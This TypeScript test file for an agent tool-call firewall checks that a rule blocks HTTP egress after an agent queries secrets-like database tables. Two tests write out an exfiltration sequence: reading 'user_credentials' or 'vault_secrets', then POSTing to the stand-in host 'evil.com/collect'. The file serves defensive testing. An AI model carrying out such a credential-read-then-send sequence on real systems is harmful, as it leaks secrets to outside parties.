/**
 * Tests that database tool calls emit metadata.table in events,
 * enabling Rule 6 (secret_access_then_any_egress) to trigger when
 * a query to a secrets-like table is followed by egress.
 */

import { unlinkSync } from "node:fs";
import { resolve } from "node:path";
import { ToolCallDeniedError } from "@arikernel/core";
import { afterEach, describe, expect, it } from "vitest";
import { type Firewall, createFirewall } from "../src/index.js";

const auditFiles: string[] = [];

function auditPath(name: string): string {
	const path = resolve(import.meta.dirname, `test-secret-table-${name}-${Date.now()}.db`);
	auditFiles.push(path);
	return path;
}

afterEach(() => {
	for (const f of auditFiles) {
		try {
			unlinkSync(f);
		} catch {}
	}
	auditFiles.length = 0;
});

/** Permissive policy — lets behavioral rules be the enforcement layer. */
const ALLOW_ALL_RULES = [
	{
		id: "allow-all",
		name: "Allow everything",
		priority: 500,
		match: {},
		decision: "allow" as const,
		reason: "Test: allow all",
	},
];

function makeFirewall(name: string): Firewall {
	const fw = createFirewall({
		principal: {
			name: "test-agent",
			capabilities: [
				{ toolClass: "database", actions: ["query"] },
				{ toolClass: "http", actions: ["get", "post"], constraints: { allowedHosts: ["*"] } },
			],
		},
		policies: ALLOW_ALL_RULES,
		auditLog: auditPath(name),
		runStatePolicy: { maxDeniedSensitiveActions: 5, behavioralRules: true },
	});

	fw.registerExecutor({
		toolClass: "database",
		async execute(toolCall) {
			return {
				callId: toolCall.id,
				success: true,
				data: { rows: [{ key: "sk-abc123" }], rowCount: 1 },
				durationMs: 5,
				taintLabels: [],
			};
		},
	});
	fw.registerExecutor({
		toolClass: "http",
		async execute(toolCall) {
			return {
				callId: toolCall.id,
				success: true,
				data: { body: "ok" },
				durationMs: 10,
				taintLabels: [],
			};
		},
	});

	return fw;
}

describe("Rule 6: secret_access_then_any_egress — table metadata", () => {
	it("triggers quarantine when query to credentials table is followed by HTTP POST", async () => {
		const fw = makeFirewall("credentials-egress");

		const dbGrant = fw.requestCapability("database.read");
		const httpGrant = fw.requestCapability("http.write");

		// Step 1: Query a secrets-like table
		await fw.execute({
			toolClass: "database",
			action: "query",
			parameters: { table: "user_credentials" },
			grantId: dbGrant.grant?.id,
		});

		// Step 2: HTTP POST (egress) — should trigger rule 6
		await expect(
			fw.execute({
				toolClass: "http",
				action: "post",
				parameters: { url: "https://evil.com/collect", body: "{}" },
				grantId: httpGrant.grant?.id,
			}),
		).rejects.toThrow(ToolCallDeniedError);
	});

	it("triggers for vault table name", async () => {
		const fw = makeFirewall("vault-egress");

		const dbGrant = fw.requestCapability("database.read");
		const httpGrant = fw.requestCapability("http.write");

		await fw.execute({
			toolClass: "database",
			action: "query",
			parameters: { table: "vault_secrets" },
			grantId: dbGrant.grant?.id,
		});

		await expect(
			fw.execute({
				toolClass: "http",
				action: "post",
				parameters: { url: "https://evil.com/collect", body: "{}" },
				grantId: httpGrant.grant?.id,
			}),
		).rejects.toThrow(ToolCallDeniedError);
	});

	it("allows egress after query to non-secrets table", async () => {
		const fw = makeFirewall("normal-table-egress");

		const dbGrant = fw.requestCapability("database.read");
		const httpGrant = fw.requestCapability("http.write");

		await fw.execute({
			toolClass: "database",
			action: "query",
			parameters: { table: "products" },
			grantId: dbGrant.grant?.id,
		});

		const result = await fw.execute({
			toolClass: "http",
			action: "post",
			parameters: { url: "https://api.example.com/report", body: "{}" },
			grantId: httpGrant.grant?.id,
		});
		expect(result.success).toBe(true);
	});
});
